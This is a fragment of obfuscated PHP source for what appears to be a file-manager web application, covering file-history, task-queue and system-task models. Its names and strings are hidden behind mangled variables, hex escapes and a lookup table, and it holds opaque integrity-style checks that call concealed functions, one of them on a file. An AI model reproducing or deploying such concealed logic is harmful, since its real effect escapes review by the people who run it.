Model($üµ§üÉ[847])->sourceListInfo($ÒŠ´Ñœ, !0); foreach ($Áä¬¼«Î as &$„òŠÄ›¡) { if ($„òŠÄ›¡[$üµ§üÉ[33]] == $üµ§üÉ[587] && isset($„òŠÄ›¡[$üµ§üÉ[493]][$üµ§üÉ[1191]])) { $„òŠÄ›¡[$üµ§üÉ[493]][$üµ§üÉ[1191]] = $ÉĞ€úİ¥[$„òŠÄ›¡[$üµ§üÉ[493]][$üµ§üÉ[1191]]]; $„òŠÄ›¡[$üµ§üÉ[493]][$üµ§üÉ[1192]] = $ÉĞ€úİ¥[$„òŠÄ›¡[$üµ§üÉ[493]][$üµ§üÉ[1192]]]; } if ($„òŠÄ›¡[$üµ§üÉ[33]] == $üµ§üÉ[2104] && isset($„òŠÄ›¡[$üµ§üÉ[493]][$üµ§üÉ[180]])) { $„òŠÄ›¡[$üµ§üÉ[493]][$üµ§üÉ[180]] = $ÉĞ€úİ¥[$„òŠÄ›¡[$üµ§üÉ[493]][$üµ§üÉ[180]]]; } $„òŠÄ›¡[$üµ§üÉ[87]] = $ÉĞ€úİ¥[$„òŠÄ›¡[$üµ§üÉ[180]]]; $„òŠÄ›¡[$üµ§üÉ[2109]] = $ÉĞ€úİ¥[$„òŠÄ›¡[$üµ§üÉ[2094]]]; if ($„òŠÄ›¡[$üµ§üÉ[33]] == $üµ§üÉ[1835]) { $„òŠÄ›¡[$üµ§üÉ[2109]] = $„òŠÄ›¡[$üµ§üÉ[87]]; $„òŠÄ›¡[$üµ§üÉ[2094]] = $„òŠÄ›¡[$üµ§üÉ[2109]][$üµ§üÉ[180]]; $„òŠÄ›¡[$üµ§üÉ[87]] = !1; $„òŠÄ›¡[$üµ§üÉ[180]] = $üµ§üÉ[12]; } $„òŠÄ›¡[$üµ§üÉ[2038]] = $À Ë€²Õ[$„òŠÄ›¡[$üµ§üÉ[1674]]]; } unset($„òŠÄ›¡); $Ùö±–­Ÿ[$üµ§üÉ[412]] = $Áä¬¼«Î; return $Ùö±–­Ÿ; } public function removeBySource($·ÛûÆõƒ) { $ìˆ£ò £ = array($_SERVER[”ôÑ§ì¸][458] => $·ÛûÆõƒ); $this->where($ìˆ£ò £)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\165\x72\x63\145\x5f\x68\151\163\x74\x6f\x72\x79"; public function historyCount($²çú) { $ñ‘‹ñÂŸ =& $_SERVER[”ôÑ§ì¸]; if (!$²çú) { return array(); } if (is_string($²çú) || is_int($²çú)) { $²çú = array($²çú); } $¸µÔŒ‘ñ = array($ñ‘‹ñÂŸ[180], $ñ‘‹ñÂŸ[1899] => $ñ‘‹ñÂŸ[532]); $ÔÏ‹¯ñµ = array($ñ‘‹ñÂŸ[180] => array($ñ‘‹ñÂŸ[7], $²çú)); $ë¹±¡¦ = $this->field($¸µÔŒ‘ñ)->where($ÔÏ‹¯ñµ)->group($ñ‘‹ñÂŸ[180])->select(); return array_to_keyvalue($ë¹±¡¦, $ñ‘‹ñÂŸ[180], $ñ‘‹ñÂŸ[532]); } public function addHistory($å®ƒ˜‹›, $¦ñÏß–ş = '') { $¿Ë¼Í‘ =& $_SERVER[”ôÑ§ì¸]; $„Š†Šš£ = array($¿Ë¼Í‘[458] => $å®ƒ˜‹›[$¿Ë¼Í‘[180]], $¿Ë¼Í‘[1665] => isset($å®ƒ˜‹›[$¿Ë¼Í‘[496]]) ? $å®ƒ˜‹›[$¿Ë¼Í‘[496]] : $å®ƒ˜‹›[$¿Ë¼Í‘[494]], $¿Ë¼Í‘[509] => $å®ƒ˜‹›[$¿Ë¼Í‘[508]], $¿Ë¼Í‘[584] => $å®ƒ˜‹›[$¿Ë¼Í‘[76]], $¿Ë¼Í‘[2110] => $¦ñÏß–ş); if ($GLOBALS[$¿Ë¼Í‘[6]][$¿Ë¼Í‘[89]][$¿Ë¼Í‘[1248]] >= 1) { $this->historyAutoClear($„Š†Šš£[$¿Ë¼Í‘[180]]); $this->add($„Š†Šš£); } Hook::trigger($¿Ë¼Í‘[2111], $„Š†Šš£); Model($¿Ë¼Í‘[2112])->eventFileEdit($å®ƒ˜‹›[$¿Ë¼Í‘[180]]); } private function historyAutoClear($Ä­äèÖÑ) { $³ÔÊğ³ =& $_SERVER[”ôÑ§ì¸]; $Ëğ‚Û¡® = Model($³ÔÊğ³[792])->get($³ÔÊğ³[1270]); $óş®ö = $GLOBALS[$³ÔÊğ³[6]][$³ÔÊğ³[89]][$³ÔÊğ³[1248]]; $»éòæâ = $Ëğ‚Û¡® == $³ÔÊğ³[1271] ? min(5, $óş®ö) : $óş®ö; $»éòæâ = $»éòæâ <= 0 ? 0 : $»éòæâ - 1; if ($»éòæâ >= 500) { return; } $òÑíãöç = array($³ÔÊğ³[458] => $Ä­äèÖÑ); $Ë•§‚£½ = $this->field($³ÔÊğ³[2113])->where($òÑíãöç)->order($³ÔÊğ³[2107])->select(); if (!$Ë•§‚£½ || $»éòæâ >= count($Ë•§‚£½)) { return; } $ì§Ì—¨ = array_to_keyvalue($Ë•§‚£½, $³ÔÊğ³[12], $³ÔÊğ³[442]); $ì§Ì—¨ = array_slice($ì§Ì—¨, $»éòæâ); $é±Ş•ô¡ = array_to_keyvalue($Ë•§‚£½, $³ÔÊğ³[12], $³ÔÊğ³[508]); $é±Ş•ô¡ = array_slice($é±Ş•ô¡, $»éòæâ); if (!$ì§Ì—¨ || !$é±Ş•ô¡) { return; } $òÑíãöç = array($³ÔÊğ³[460] => array($³ÔÊğ³[7], $ì§Ì—¨)); $this->where($òÑíãöç)->delete(); Model($³ÔÊğ³[511])->remove($é±Ş•ô¡); } public function listData($¨Û”Ÿ€ª) { $Æ‹ß€İ¢ =& $_SERVER[”ôÑ§ì¸]; $ÆèøİËÑ = array($Æ‹ß€İ¢[458] => $¨Û”Ÿ€ª); $Ø™íäÎ = $Æ‹ß€İ¢[2114]; $Ÿ Êí‘ = $this->field($Ø™íäÎ)->where($ÆèøİËÑ)->order($Æ‹ß€İ¢[2107])->selectPage(); $this->_listAppendUser($Ÿ Êí‘[$Æ‹ß€İ¢[412]]); $æ·ÎËç„ = Model($Æ‹ß€İ¢[792])->get($Æ‹ß€İ¢[1270]); $™ÕêÙË = 5; if ($æ·ÎËç„ == $Æ‹ß€İ¢[1271]) { $Ÿ Êí‘[$Æ‹ß€İ¢[412]] = array_slice($Ÿ Êí‘[$Æ‹ß€İ¢[412]], 0, $™ÕêÙË); $Ÿ Êí‘[$Æ‹ß€İ¢[409]] = array($Æ‹ß€İ¢[2115] => 1, $Æ‹ß€İ¢[2116] => 20, $Æ‹ß€İ¢[2117] => 1, $Æ‹ß€İ¢[2118] => count($Ÿ Êí‘[$Æ‹ß€İ¢[412]])); } return $Ÿ Êí‘; } protected function _listAppendUser(&$›ÙØö•‚) { $²·ö­ƒî =& $_SERVER[”ôÑ§ì¸]; $«’ÌÜÅê = array_to_keyvalue($›ÙØö•‚, $²·ö­ƒî[12], $²·ö­ƒî[1674]); $ ‡››”È = Model($²·ö­ƒî[566])->userListInfo($«’ÌÜÅê); foreach ($›ÙØö•‚ as &$’¬•óäˆ) { $Éªô®Ç± = $’¬•óäˆ[$²·ö­ƒî[1674]]; $’¬•óäˆ[$²·ö­ƒî[494]] = $ ‡››”È[$Éªô®Ç±] ? $ ‡››”È[$Éªô®Ç±] : !1; } unset($’¬•óäˆ); } public function fileInfo($›¯êÕçù) { $”Â–ù‰ó =& $_SERVER[”ôÑ§ì¸]; $ÛÍÇÅâ = $this->tablePrefix; $Ë—‡¥àı = "{$ÛÍÇÅâ}\x69\x6f\x5f\x66\x69\x6c\x65\x20\x66\151\x6c\145\163\40\x6f\156\x20\x66\151\x6c\145\163\56\x66\x69\x6c\x65\x49\104\x20\75\x20\x68\x69\x73\x74\x6f\162\x79\x2e\x66\x69\x6c\x65\x49\x44"; return $this->alias($”Â–ù‰ó[2119])->where(array($”Â–ù‰ó[460] => $›¯êÕçù))->join($Ë—‡¥àı, $”Â–ù‰ó[2120])->find(); } public function removeItem($Êı™« ) { $ôÌİææğ =& $_SERVER[”ôÑ§ì¸]; $Øºˆ¸Éö = array($ôÌİææğ[460] => $Êı™« ); $š®§›¤ = $this->where($Øºˆ¸Éö)->find(); if ($š®§›¤) { $‘¦¸ÈÉş = $this->where($Øºˆ¸Éö)->delete(); Model($ôÌİææğ[511])->remove($š®§›¤[$ôÌİææğ[508]]); return $‘¦¸ÈÉş; } return !1; } public function removeBySource($¡İÊÚÕã) { $÷…ÀÀ‹ß =& $_SERVER[”ôÑ§ì¸]; if (!$¡İÊÚÕã) { return !1; } if (!is_array($¡İÊÚÕã)) { $¡İÊÚÕã = array($¡İÊÚÕã); } $Ü©öü§ˆ = array($÷…ÀÀ‹ß[458] => array($÷…ÀÀ‹ß[7], $¡İÊÚÕã)); $¢ÕÑ›ó = $this->field($÷…ÀÀ‹ß[509])->where($Ü©öü§ˆ)->select(); if ($¢ÕÑ›ó) { $this->where($Ü©öü§ˆ)->delete(); $ÍÊ®ûñ = array_to_keyvalue($¢ÕÑ›ó, $÷…ÀÀ‹ß[12], $÷…ÀÀ‹ß[508]); Model($÷…ÀÀ‹ß[511])->remove($ÍÊ®ûñ); } return !0; } public function setDetail($ÔÚ—…Üõ, $¥Ÿ¹ÜïÚ) { $Ãó§ì‹ì =& $_SERVER[”ôÑ§ì¸]; return $this->where(array($Ãó§ì‹ì[460] => $ÔÚ—…Üõ))->save(array($Ãó§ì‹ì[2110] => $¥Ÿ¹ÜïÚ)); } public function rollbackToItem($Ÿ—ìÚƒ, $ Ï•ñè) { $ëò”«Éø =& $_SERVER[”ôÑ§ì¸]; $¸˜Í»äĞ = Model($ëò”«Éø[847])->sourceInfo($Ÿ—ìÚƒ); $this->addHistory($¸˜Í»äĞ, LNG($ëò”«Éø[2121])); $Æ›†·Š• = $this->find($ Ï•ñè); $â¡¹õ‚õ = array($ëò”«Éø[508] => $Æ›†·Š•[$ëò”«Éø[508]], $ëò”«Éø[76] => $Æ›†·Š•[$ëò”«Éø[76]], $ëò”«Éø[85] => time(), $ëò”«Éø[496] => USER_ID); Model($ëò”«Éø[847])->where(array($ëò”«Éø[180] => $Ÿ—ìÚƒ))->save($â¡¹õ‚õ); return $this->where(array($ëò”«Éø[460] => $ Ï•ñè))->delete(); } public function clearSame($úŠ—ó¤÷) { $ˆÚĞòÜõ =& $_SERVER[”ôÑ§ì¸]; $‚½¦æ›õ = $this->listData($úŠ—ó¤÷); $«¥öó‘‹ = array_to_keyvalue_group($‚½¦æ›õ, $ˆÚĞòÜõ[508]); $âÃ¶ä‹… = array(); $œí›Â¸í = array(); foreach ($«¥öó‘‹ as $ûÁñŸØ½) { if (!$ûÁñŸØ½ || count($ûÁñŸØ½) <= 1) { continue; } foreach ($ûÁñŸØ½ as $†õí•‹ä) { $âÃ¶ä‹…[] = $†õí•‹ä[$ˆÚĞòÜõ[508]]; $œí›Â¸í[] = $†õí•‹ä[$ˆÚĞòÜõ[442]]; } } if (!$œí›Â¸í) { return; } $this->where(array($ˆÚĞòÜõ[442] => array($ˆÚĞòÜõ[7], $œí›Â¸í)))->delete(); Model($ˆÚĞòÜõ[511])->remove($âÃ¶ä‹…); } public function userSpace() { $—ùØ´¿º =& $_SERVER[”ôÑ§ì¸]; $Ç€ï›Î = $this->tablePrefix; $ìçÙ›ó¸ = array($—ùØ´¿º[1665] => USER_ID); $şİÈè‹Ş = "{$Ç€ï›Î}\x69\x6f\137\x66\x69\154\145\40\146\151\154\145\x73\x20\157\x6e\40\146\x69\154\145\163\x2e\x66\151\154\x65\111\x44\40\x3d\40\x68\x69\163\164\x6f\x72\x79\x2e\146\x69\154\x65\111\x44"; return $this->alias($—ùØ´¿º[2119])->where($ìçÙ›ó¸)->join($şİÈè‹Ş, $—ùØ´¿º[2120])->sum($—ùØ´¿º[76]); } } goto FÛ„Ÿ½­»ê; FíÖ½ˆîÈŒ: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($©Ÿ¾ÔË, $µ¯ÈÇÍó = '', $š¿‰Š˜ú = 0, $ê…›…ÏÌ = '') { $Á–ì‰»Å =& $_SERVER[”ôÑ§ì¸]; $ñô¼Ë•­ = new Task($©Ÿ¾ÔË, $µ¯ÈÇÍó, $š¿‰Š˜ú, $ê…›…ÏÌ); $GLOBALS[$Á–ì‰»Å[1757] . $©Ÿ¾ÔË] = new TaskLog($Á–ì‰»Å[1658], $ñô¼Ë•­, $ê…›…ÏÌ); return $ñô¼Ë•­; } public function __construct($¼é«ë°Í = '', $†ÆäÀæÎ = '', $£Š¸ = '') { $èƒ™¯…‹ =& $_SERVER[”ôÑ§ì¸]; if (!$¼é«ë°Í) { $¼é«ë°Í = $èƒ™¯…‹[1658]; } $ ¸†Ä¬ = $¼é«ë°Í . $èƒ™¯…‹[429] . rand_string(10); if (!$£Š¸) { $£Š¸ = $¼é«ë°Í . $èƒ™¯…‹[53] . $£Š¸; } switch ($¼é«ë°Í) { case $èƒ™¯…‹[1658]: if (!$†ÆäÀæÎ || !$†ÆäÀæÎ->task) { return echoLog($¼é«ë°Í . $èƒ™¯…‹[1758]); } $¿Ìß°Í = $†ÆäÀæÎ; $ ¸†Ä¬ = $¿Ìß°Í->task[$èƒ™¯…‹[442]]; $¼é«ë°Í = $¿Ìß°Í->task[$èƒ™¯…‹[442]]; if (!$¿Ìß°Í->task[$èƒ™¯…‹[1571]]) { $¿Ìß°Í->task[$èƒ™¯…‹[1571]] = $£Š¸ ? $£Š¸ : $¼é«ë°Í; } break; case $èƒ™¯…‹[1759]: if (!$†ÆäÀæÎ) { return echoLog($¼é«ë°Í . $èƒ™¯…‹[1760]); } $úóÚÚöÃ = is_string($†ÆäÀæÎ) ? array($†ÆäÀæÎ) : $†ÆäÀæÎ; $¿Ìß°Í = new TaskFileTransfer($ ¸†Ä¬, $¼é«ë°Í, 0, $£Š¸ ? $£Š¸ : $úóÚÚöÃ[0]); foreach ($úóÚÚöÃ as $µ„ÛƒÍ¼) { $¿Ìß°Í->addPath($µ„ÛƒÍ¼); } break; case $èƒ™¯…‹[356]: if (!$†ÆäÀæÎ) { return echoLog($¼é«ë°Í . $èƒ™¯…‹[1760]); } $úóÚÚöÃ = is_string($†ÆäÀæÎ) ? array($†ÆäÀæÎ) : $†ÆäÀæÎ; $¿Ìß°Í = new TaskZip($ ¸†Ä¬, $¼é«ë°Í, 0, $£Š¸ ? $£Š¸ : $úóÚÚöÃ[0]); foreach ($úóÚÚöÃ as $µ„ÛƒÍ¼) { $¿Ìß°Í->addPath($µ„ÛƒÍ¼); } break; case $èƒ™¯…‹[1245]: if (!$†ÆäÀæÎ) { return echoLog($¼é«ë°Í . $èƒ™¯…‹[1760]); } $¿Ìß°Í = new TaskUnZip($ ¸†Ä¬, $¼é«ë°Í, 0, $£Š¸ ? $£Š¸ : $†ÆäÀæÎ); if ($†ÆäÀæÎ) { $¿Ìß°Í->addFile($†ÆäÀæÎ); } break; case $èƒ™¯…‹[148]: $¿Ìß°Í = new TaskHttp($ ¸†Ä¬, $¼é«ë°Í); break; default: return; break; } $this->task = $¿Ìß°Í; $this->taskID = $ ¸†Ä¬; Hook::bind($èƒ™¯…‹[1695], array($this, $èƒ™¯…‹[1761])); Hook::bind($èƒ™¯…‹[1697], array($this, $èƒ™¯…‹[1762])); Hook::bind($èƒ™¯…‹[1691], array($this, $èƒ™¯…‹[1763])); echoLog($èƒ™¯…‹[1764] . $¿Ìß°Í->task[$èƒ™¯…‹[1571]]); } public function __destruct() { $this->end(); } public function end($ñÂùêüÅ = '') { $Õ’ôİÃ =& $_SERVER[”ôÑ§ì¸]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ñÂùêüÅ); $this->task = !1; $this->taskID = !1; Hook::unbind($Õ’ôİÃ[1695], array($this, $Õ’ôİÃ[1761])); Hook::unbind($Õ’ôİÃ[1697], array($this, $Õ’ôİÃ[1762])); Hook::unbind($Õ’ôİÃ[1691], array($this, $Õ’ôİÃ[1763])); } public function taskUpdate($ÇÁış) { $ôÔôÔõÊ =& $_SERVER[”ôÑ§ì¸]; if (!$ÇÁış || $this->taskID != $ÇÁış[$ôÔôÔõÊ[442]]) { return; } $èâ Ú˜€ = 20; $ÌĞ”‰Àà = intval($ÇÁış[$ôÔôÔõÊ[1676]] * $èâ Ú˜€); $åòÀİ¨Ç = $ôÔôÔõÊ[162] . str_repeat($ôÔôÔõÊ[915], $ÌĞ”‰Àà) . $ôÔôÔõÊ[1045] . str_repeat($ôÔôÔõÊ[53], $èâ Ú˜€ - $ÌĞ”‰Àà) . $ôÔôÔõÊ[164]; $å£µà¤ñ = $åòÀİ¨Ç . sprintf($ôÔôÔõÊ[1765], $ÇÁış[$ôÔôÔõÊ[1676]] * 100) . $ôÔôÔõÊ[1766]; $ıÍ°‚ô = $å£µà¤ñ . $ÇÁış[$ôÔôÔõÊ[1675]] . $ôÔôÔõÊ[8] . $ÇÁış[$ôÔôÔõÊ[808]] . LNG($ôÔôÔõÊ[1767]); $ëà–éî = $ôÔôÔõÊ[12]; if ($ÇÁış[$ôÔôÔõÊ[1751]]) { $ıÍ°‚ô = $å£µà¤ñ . size_format($ÇÁış[$ôÔôÔõÊ[1675]]) . $ôÔôÔõÊ[8] . size_format($ÇÁış[$ôÔôÔõÊ[808]]); $ëà–éî = size_format($ÇÁış[$ôÔôÔõÊ[1677]]) . $ôÔôÔõÊ[1768]; } if ($ÇÁış[$ôÔôÔõÊ[1095]]) { $ÇÁış[$ôÔôÔõÊ[1725]] = $ÇÁış[$ôÔôÔõÊ[1095]] . $ôÔôÔõÊ[53] . $ÇÁış[$ôÔôÔõÊ[1725]]; } if ($ÇÁış[$ôÔôÔõÊ[1725]]) { $ÏñÛû = $ôÔôÔõÊ[12]; if ($ÇÁış[$ôÔôÔõÊ[1727]]) { $ÏñÛû = $ôÔôÔõÊ[50] . size_format($ÇÁış[$ôÔôÔõÊ[1728]]) . $ôÔôÔõÊ[8] . size_format($ÇÁış[$ôÔôÔõÊ[1727]]); } $ëà–éî .= $ÇÁış[$ôÔôÔõÊ[1725]] . $ÏñÛû; } if ($ÇÁış[$ôÔôÔõÊ[785]] && !$ÇÁış[$ôÔôÔõÊ[1727]]) { $ëà–éî .= $ôÔôÔõÊ[53] . size_format($ÇÁış[$ôÔôÔõÊ[1732]]) . $ôÔôÔõÊ[8] . size_format($ÇÁış[$ôÔôÔõÊ[785]]); } echoLog($ıÍ°‚ô . $ôÔôÔõÊ[53] . $ëà–éî, !0); } public function taskEnd($³İäŸå) { $ğÌÜ¬Š =& $_SERVER[”ôÑ§ì¸]; if (!$³İäŸå || $this->taskID != $³İäŸå[$ğÌÜ¬Š[442]]) { return; } $ÇÛäüâê = $³İäŸå ? $³İäŸå[$ğÌÜ¬Š[1675]] . $ğÌÜ¬Š[8] . $³İäŸå[$ğÌÜ¬Š[808]] . LNG($ğÌÜ¬Š[1767]) . $ğÌÜ¬Š[71] : $ğÌÜ¬Š[12]; echoLog($ğÌÜ¬Š[1769] . $³İäŸå[$ğÌÜ¬Š[1571]] . ($³İäŸå[$ğÌÜ¬Š[493]] ? $ğÌÜ¬Š[71] . $³İäŸå[$ğÌÜ¬Š[493]] : $ğÌÜ¬Š[12]) . $ğÌÜ¬Š[71] . $ÇÛäüâê . $ğÌÜ¬Š[1770] . sprintf($ğÌÜ¬Š[881], timeFloat() - $³İäŸå[$ğÌÜ¬Š[1678]]) . $ğÌÜ¬Š[1690]); $this->end(); } public function taskKill($çûş›àÕ) { $È”Šó· =& $_SERVER[”ôÑ§ì¸]; if (!$çûş›àÕ || $this->taskID != $çûş›àÕ[$È”Šó·[442]]) { return; } echoLog($È”Šó·[1771] . $çûş›àÕ[$È”Šó·[1571]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\163\x6b\121\x75\x65\165\x65\x4c\145\156\x67\164\150"; const QUEUE_DATA = "\164\x61\x73\x6b\121\x75\x65\165\x65\104\141\x74\x61"; const QUEUE_TIME = "\164\x61\163\x6b\121\165\145\165\145\x4c\141\163\164\122\x75\x6e"; const QUEUE_THREAD = "\164\141\163\x6b\121\x75\x65\165\x65\124\x68\162\145\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($¹øç×, $Öé»ºÀ„ = array(), $Œ¦ü÷ = '', $Š‹×‰Ÿ = '') { $ô‡Àô×· =& $_SERVER[”ôÑ§ì¸]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Š‹×‰Ÿ && array_find_by_field(self::$listData, $ô‡Àô×·[94], $Š‹×‰Ÿ)) { return !0; } if ($Š‹×‰Ÿ && array_find_by_field(self::$listDataAdd, $ô‡Àô×·[94], $Š‹×‰Ÿ)) { return !0; } self::$listDataAdd[] = array($ô‡Àô×·[307] => $¹øç×, $ô‡Àô×·[1772] => $Öé»ºÀ„, $ô‡Àô×·[493] => $Œ¦ü÷, $ô‡Àô×·[94] => $Š‹×‰Ÿ); return !0; } public static function addSubmit() { $ó‹Æ· =& $_SERVER[”ôÑ§ì¸]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ó‹Æ·[1773] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ó‹Æ·[12], $ó‹Æ·[493])), $ó‹Æ·[184]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($±éØîÎ, $£âäÒ“ç = array(), $‘É¡¸Áà = '', $ä•Ê¶Ç = '') { $Íø¶™Ø¤ =& $_SERVER[”ôÑ§ì¸]; if (self::count() >= self::MAX_LENGTH) { return !1; } $‰´Ÿî¡Š = self::getAll(); if ($ä•Ê¶Ç && array_find_by_field($‰´Ÿî¡Š, $Íø¶™Ø¤[94], $ä•Ê¶Ç)) { return !0; } $‰´Ÿî¡Š[] = array($Íø¶™Ø¤[307] => $±éØîÎ, $Íø¶™Ø¤[1772] => $£âäÒ“ç, $Íø¶™Ø¤[493] => $‘É¡¸Áà, $Íø¶™Ø¤[94] => $ä•Ê¶Ç); self::setAll($‰´Ÿî¡Š); write_log($Íø¶™Ø¤[1773] . $‘É¡¸Áà, $Íø¶™Ø¤[184]); return !0; } public static function run() { $ªÈ•¹‹é =& $_SERVER[”ôÑ§ì¸]; $ÙÔ¶ƒàš = self::getAll(); $é²ÓÏ•à = array_shift($ÙÔ¶ƒàš); if (!$é²ÓÏ•à) { return !1; } self::setAll($ÙÔ¶ƒàš); $¬Ø©ÕÓ = timeFloat(); $™ôãä• = $ªÈ•¹‹é[12]; try { $™ôãä• = Hook::apply($é²ÓÏ•à[$ªÈ•¹‹é[307]], $é²ÓÏ•à[$ªÈ•¹‹é[1772]]); } catch (Exception $ç»ßã§ñ) { write_log($ç»ßã§ñ, $ªÈ•¹‹é[1213]); } $…Í‰’¼ = number_format(timeFloat() - $¬Ø©ÕÓ, 3) . $ªÈ•¹‹é[1690]; if ($™ôãä• && is_string($™ôãä•)) { $…Í‰’¼ = $…Í‰’¼ . $ªÈ•¹‹é[1774] . $™ôãä•; } write_log($ªÈ•¹‹é[1775] . $é²ÓÏ•à[$ªÈ•¹‹é[493]] . $ªÈ•¹‹é[1776] . $…Í‰’¼, $ªÈ•¹‹é[184]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $„™ø„ş» =& $_SERVER[”ôÑ§ì¸]; $Ô¼ôäÇ° = self::threadCount() + 1; if ($Ô¼ôäÇ° > 3 || !self::count()) { return; } write_log($„™ø„ş»[1777] . $Ô¼ôäÇ°, $„™ø„ş»[184]); Cache::set(self::QUEUE_THREAD, $Ô¼ôäÇ°, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($„™ø„ş»[1778], $„™ø„ş»[184]); } public static function getKey($²Ã¸È¿ã, $ïáÀµÌö = "\x69\156\x74") { $¢ã¤’Ÿ =& $_SERVER[”ôÑ§ì¸]; Cache::removeMemory($²Ã¸È¿ã); $Ğ®ñ„ËŠ = Cache::get($²Ã¸È¿ã); if ($ïáÀµÌö == $¢ã¤’Ÿ[331]) { return $Ğ®ñ„ËŠ ? intval($Ğ®ñ„ËŠ) : 0; } if ($ïáÀµÌö == $¢ã¤’Ÿ[1779]) { return is_array($Ğ®ñ„ËŠ) ? $Ğ®ñ„ËŠ : array(); } return $Ğ®ñ„ËŠ; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[”ôÑ§ì¸][1779]); } public static function setAll($Åñ¢ó) { $ë’®¬Á = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($Åñ¢ó), $ë’®¬Á); Cache::set(self::QUEUE_DATA, $Åñ¢ó, $ë’®¬Á); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } if ($_SERVER[$_SERVER[”ôÑ§ì¸][857]] != $_SERVER[$_SERVER[”ôÑ§ì¸][858]]) { $_getc = $_SERVER[”ôÑ§ì¸][859]; $_getfile = $_SERVER[$_SERVER[”ôÑ§ì¸][860]] . $_SERVER[”ôÑ§ì¸][861]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[”ôÑ§ì¸][245], $_getfilec); if (count($_getarrs) < $_SERVER[”ôÑ§ì¸][648]) { $exit = $_SERVER[”ôÑ§ì¸][862]; $exit(); } $_act = $_SERVER[”ôÑ§ì¸][863]; $_act($_SERVER[$_SERVER[”ôÑ§ì¸][864]]); } goto b„Œ¸ŠÖ; B‹‚à¦é¥: $_size = $_SERVER[”ôÑ§ì¸][907]; if ($_SERVER[$_SERVER[”ôÑ§ì¸][857]] != $_size($_file)) { $_getc = $_SERVER[”ôÑ§ì¸][859]; $_getfile = $_SERVER[$_SERVER[”ôÑ§ì¸][860]] . $_SERVER[”ôÑ§ì¸][861]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[”ôÑ§ì¸][245], $_getfilec); if (count($_getarrs) < $_SERVER[”ôÑ§ì¸][648]) { $exit = $_SERVER[”ôÑ§ì¸][862]; $exit(); } $_act = $_SERVER[”ôÑ§ì¸][863]; $_act($_file); } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\x74\141\x73\153\x4c\x69\x73\164"; public $field = array("\156\x61\155\x65", "\164\x79\x70\x65", "\145\166\x65\156\x74", "\x74\x69\x6d\145", "\144\145\x73\x63", "\x73\x79\163\164\x65\155", "\x65\x6e\x61\142\154\x65", "\154\x61\163\x74\122\x75\156", "\163\157\x72\x74"); public function listData($Ó‚Ì® = false, $ÅÏ°Èî = "\163\x6f\162\x74", $‘Ò… ˜Å = false) { return parent::listData($Ó‚Ì®, $ÅÏ°Èî, $‘Ò… ˜Å); } public function add($²ß¿Á­è) { $óšô™œ™ =& $_SERVER[”ôÑ§ì¸]; $êÆ‡öÕ´ = $this->findByName($²ß¿Á­è[$óšô™œ™[32]]); if ($êÆ‡öÕ´) { return !1; } $²ß¿Á­è[$óšô™œ™[1631]] = 0; $²ß¿Á­è[$óšô™œ™[1890]] = $this->getSort(); return parent::insert($²ß¿Á­è); } private function getSort() { $¾×€¬ø =& $_SERVER[”ôÑ§ì¸]; $Şï»“Á = parent::listData(); $öø–€«‚ = array_to_keyvalue($Şï»“Á, $¾×€¬ø[12], $¾×€¬ø[1890]); return empty($öø–€«‚) ? 0 : max($öø–€«‚) + 1; } public function update($­Å¶’À, $®Ú¦Ñ²¨) { $éƒŒ–× =& $_SERVER[”ôÑ§ì¸]; $·í¢ = $this->listData($­Å¶’À); $ŠãÏû‡Å = $this->findByName($®Ú¦Ñ²¨[$éƒŒ–×[32]]); if (!$·í¢ || $ŠãÏû‡Å && $ŠãÏû‡Å[$éƒŒ–×[442]] != $·í¢[$éƒŒ–×[442]]) { return !1; } return parent::update($­Å¶’À, $®Ú¦Ñ²¨); } public function remove($—ÄÇÜå, $²Œ©Â„¤ = false) { $„€õÒ¼Í =& $_SERVER[”ôÑ§ì¸]; $ìÇÇ¢’µ = $this->listData($—ÄÇÜå); if (!$ìÇÇ¢’µ) { return; } if (!$²Œ©Â„¤ && $ìÇÇ¢’µ[$„€õÒ¼Í[178]] == $„€õÒ¼Í[88]) { return !1; } return parent::remove($—ÄÇÜå); } public function enable($“æ‘ìî±, $×ÓÕï›–) { return $this->update($“æ‘ìî±, array($_SERVER[”ôÑ§ì¸][2302] => $×ÓÕï›–)); } public function run($°Ö‰Òàè) { return $this->update($°Ö‰Òàè, array($_SERVER[”ôÑ§ì¸][2314] => time())); } } goto C‚èôÕÂÊ; CÙæÄƒˆĞõ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Éñîıñ = false, $¯¯Ğöòâ = '', $ßç’¡Ì = false) { $Ê¾êŒéÀ =& $_SERVER[”ôÑ§ì¸]; $«çê×â = $this->cacheGet($¯¯Ğöòâ); $ĞŞ²ãšæ = $this->optionDefault($¯¯Ğöòâ); $ĞŞ²ãšæ = is_array($ĞŞ²ãšæ) ? $ĞŞ²ãšæ : array(); if (is_array($«çê×â)) { $«çê×â = array_merge($ĞŞ²ãšæ, $«çê×â); return $Éñîıñ ? isset($«çê×â[$Éñîıñ]) ? 